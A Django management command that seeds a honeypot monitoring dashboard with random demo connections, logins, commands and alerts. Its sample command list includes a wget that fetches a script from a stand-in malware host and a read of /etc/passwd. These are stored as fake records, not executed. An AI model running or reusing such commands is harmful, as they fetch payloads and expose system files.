import random
from datetime import datetime, timedelta
from django.core.management.base import BaseCommand
from django.utils import timezone
from dashboard.models import Connection, LoginAttempt, Command as HoneypotCommand, FileActivity, Alert, AttackerProfile, HoneypotService

class Command(BaseCommand):
    help = 'Populates the database with demo data for testing'

    def handle(self, *args, **options):
        self.stdout.write('Generating demo data...')
        
        # Countries and coordinates
        countries = [
            ('US', 'United States', 37.0902, -95.7129),
            ('CN', 'China', 35.8617, 104.1954),
            ('RU', 'Russia', 61.5240, 105.3188),
            ('BR', 'Brazil', -14.2350, -51.9253),
            ('IN', 'India', 20.5937, 78.9629),
            ('DE', 'Germany', 51.1657, 10.4515),
        ]
        
        protocols = ['SSH', 'HTTP', 'FTP', 'TELNET', 'SMB']
        usernames = ['admin', 'root', 'user', 'guest', 'support', 'oracle']
        passwords = ['123456', 'password', 'admin123', 'root', 'toor']
        commands = ['ls -la', 'wget http://malware.com/bad.sh', 'cat /etc/passwd', 'whoami', 'reboot']
        
        # Create some base attacker IPs
        attackers = []
        for i in range(20):
            country_code, country_name, lat, lng = random.choice(countries)
            # Add some jitter to coordinates
            lat += random.uniform(-5, 5)
            lng += random.uniform(-5, 5)
            
            ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            attackers.append({
                'ip': ip,
                'country_code': country_code,
                'country': country_name,
                'lat': lat,
                'lng': lng
            })
            
        # Generate Connections (last 24 hours)
        now = timezone.now()
        for i in range(100):
            attacker = random.choice(attackers)
            protocol = random.choice(protocols)
            timestamp = now - timedelta(minutes=random.randint(1, 1440))
            
            Connection.objects.create(
                ip_address=attacker['ip'],
                protocol=protocol,
                port=random.randint(1024, 65535),
                timestamp=timestamp,
                country=attacker['country'],
                city='Unknown',
                latitude=attacker['lat'],
                longitude=attacker['lng']
            )
            
            # 30% chance of login attempt
            if random.random() < 0.3:
                LoginAttempt.objects.create(
                    ip_address=attacker['ip'],
                    username=random.choice(usernames),
                    password=random.choice(passwords),
                    service=protocol,
                    success=random.random() < 0.05, # 5% chance of success (scary!)
                    timestamp=timestamp + timedelta(seconds=random.randint(1, 10))
                )
                
            # 10% chance of command
            if random.random() < 0.1:
                HoneypotCommand.objects.create(
                    ip_address=attacker['ip'],
                    command=random.choice(commands),
                    service=protocol,
                    risk_level=random.choice(['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']),
                    timestamp=timestamp + timedelta(seconds=random.randint(10, 20))
                )
                
        # Generate Alerts
        alert_types = ['BRUTE_FORCE', 'MALWARE', 'EXPLOIT', 'SCANNING']
        for i in range(15):
            attacker = random.choice(attackers)
            Alert.objects.create(
                alert_type=random.choice(alert_types),
                severity=random.choice(['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']),
                title=f"Suspicious activity detected from {attacker['ip']}",
                description=f"Automated detection system flagged unusual behavior consistent with known attack patterns.",
                ip_address=attacker['ip'],
                timestamp=now - timedelta(hours=random.randint(1, 48)),
                is_acknowledged=random.choice([True, False])
            )
            
        # Update Profiles (simplified)
        for attacker in attackers:
            defaults = {
                'first_seen': now,
                'last_seen': now,
                'country': attacker['country'],
                'threat_score': random.randint(10, 100),
                'total_connections': Connection.objects.filter(ip_address=attacker['ip']).count()
            }
            profile, created = AttackerProfile.objects.get_or_create(
                ip_address=attacker['ip'],
                defaults=defaults
            )
            if not created:
                profile.last_seen = now
                profile.total_connections = Connection.objects.filter(ip_address=attacker['ip']).count()
                profile.save()
        
        # Initialize Honeypot Services
        services = [
            ('SSH', 2222),
            ('FTP', 2121),
            ('HTTP', 8080),
            ('TELNET', 2323),
            ('SMB', 4445),
        ]
        
        for name, port in services:
            HoneypotService.objects.get_or_create(
                name=name,
                defaults={
                    'port': port,
                    'status': 'RUNNING',
                    'started_at': now,
                    'total_connections': Connection.objects.filter(protocol=name).count()
                }
            )

        # Fix missing profiles for any existing connections (Legacy data fix)
        all_ips = Connection.objects.values_list('ip_address', flat=True).distinct()
        for ip in all_ips:
            if not AttackerProfile.objects.filter(ip_address=ip).exists():
                AttackerProfile.objects.create(
                    ip_address=ip,
                    first_seen=now,
                    last_seen=now,
                    country=Connection.objects.filter(ip_address=ip).first().country,
                    threat_score=random.randint(10, 50)
                )

        self.stdout.write(self.style.SUCCESS('Successfully populated demo data and initialized services! Refresh your dashboard.'))
